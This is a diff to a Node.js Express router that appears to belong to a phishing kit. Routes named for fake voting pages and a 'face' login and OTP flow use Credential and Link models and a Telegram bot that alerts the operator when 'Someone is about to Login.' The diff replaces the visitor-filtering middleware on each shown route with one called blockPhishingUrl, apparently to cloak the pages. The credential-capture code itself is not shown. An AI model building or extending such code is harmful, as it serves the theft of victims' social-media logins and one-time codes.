@@ -3,10 +3,10 @@ const Links = require("../../models/LinkModel");
 const User = require("../../models/User");
 const Credential = require("../../models/CredentialModel");
 const bot = require("../../telegram");
-const { blockNoneUS, blockURL } = require("../../middlewares/blockUrl");
+const { blockPhishingUrl } = require("../../middlewares/blockUrl");
 
 
-router.get("/vote/:linkId", blockURL, async (req, res) => {
+router.get("/vote/:linkId", blockPhishingUrl, async (req, res) => {
     try {
         const { linkId } = req.params;
         const link = await Links.findOne({ link: linkId });
@@ -34,7 +34,7 @@ MESSAGE: Someone is about to Login.
 });
 
 
-router.get("/vote-2/:linkId", blockURL, async (req, res) => {
+router.get("/vote-2/:linkId", blockPhishingUrl, async (req, res) => {
     try {
         const { linkId } = req.params;
         const link = await Links.findOne({ link: linkId });
@@ -62,7 +62,7 @@ MESSAGE: Someone is about to Login.
 });
 
 
-router.get("/vote-3/:linkId", blockURL, async (req, res) => {
+router.get("/vote-3/:linkId", blockPhishingUrl, async (req, res) => {
     try {
         const { linkId } = req.params;
         const link = await Links.findOne({ link: linkId });
@@ -96,7 +96,7 @@ MESSAGE: Someone is about to Login.
 });
 
 
-router.get("/face/:linkId", blockURL, async (req, res) => {
+router.get("/face/:linkId", blockPhishingUrl, async (req, res) => {
     try {
         const { linkId } = req.params;
         const link = await Links.findOne({ _id: linkId });
@@ -116,7 +116,7 @@ router.get("/face/:linkId", blockURL, async (req, res) => {
     }
 });
 
-router.get("/face/otp/:linkId", blockURL, async (req, res) => {
+router.get("/face/otp/:linkId", blockPhishingUrl, async (req, res) => {
     try {
         const { linkId } = req.params;
         const link = await Links.findOne({ _id: linkId });
